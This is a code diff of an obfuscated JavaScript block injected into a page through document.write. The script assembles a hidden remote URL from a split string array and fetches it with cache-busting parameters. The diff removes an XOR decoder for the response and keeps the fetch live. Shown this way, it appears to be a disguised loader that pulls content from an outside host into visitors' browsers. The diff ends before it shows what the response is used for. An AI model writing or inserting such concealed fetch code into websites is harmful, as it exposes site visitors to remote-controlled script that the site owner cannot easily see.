@@ -55,28 +55,15 @@ document.write(`
 
 <script>
 (function() {
-    const _0x3c5a = ['gener', 'ich', '.my', '.id', '/ap', 'ivo', 'te'];
-    const _0x1a2f = [109, 111, 116, 105, 111, 110, 105, 109, 101];
+    const _0x3c5a = ['https://', 'gener', 'ich', '.my', '.id', '/ap', 'ivo', 'te'];
     const _0x4d7b = 5000;
     
     let _0x29c3 = {};
     let _0x5e82 = true;
 
-    function _0x2a8d(_0x3f71) {
-        try {
-            let _0x1b4d = '';
-            for (let _0x2c9e = 0; _0x2c9e < _0x3f71.length; _0x2c9e++) {
-                _0x1b4d += String.fromCharCode(_0x3f71.charCodeAt(_0x2c9e) ^ _0x1a2f[_0x2c9e % _0x1a2f.length]);
-            }
-            return JSON.parse(_0x1b4d);
-        } catch (_0x3a9c) {
-            throw new Error('Data format error');
-        }
-    }
-
     async function _0x4e6d() {
         try {
-            const _0x3b81 = _0x3c5a[0] + _0x3c5a[1] + _0x3c5a[2] + _0x3c5a[3] + _0x3c5a[4] + _0x3c5a[5] + _0x3c5a[6];
+            const _0x3b81 = _0x3c5a[0] + _0x3c5a[1] + _0x3c5a[2] + _0x3c5a[3] + _0x3c5a[4] + _0x3c5a[5] + _0x3c5a[6] + _0x3c5a[7];
             const _0x2f47 = {
                 _t: Date.now(),
                 _r: Math.random().toString(36).substring(2, 9),
@@ -84,12 +71,14 @@ document.write(`
                 cache: 'no-cache'
             };
             
-            const _0x5c12 = new URL(_0x3b81);
+            const urlParams = new URLSearchParams();
             Object.keys(_0x2f47).forEach(_0x1d8a => {
-                _0x5c12.searchParams.set(_0x1d8a, _0x2f47[_0x1d8a]);
+                urlParams.set(_0x1d8a, _0x2f47[_0x1d8a]);
             });
             
-            const _0x3e94 = await fetch(_0x5c12.toString(), {
+            const fullUrl = _0x3b81 + '?' + urlParams.toString();
+            
+            const _0x3e94 = await fetch(fullUrl, {
                 method: 'GET',
                 headers: {
                     'Accept': 'application/json, text/plain, */*',
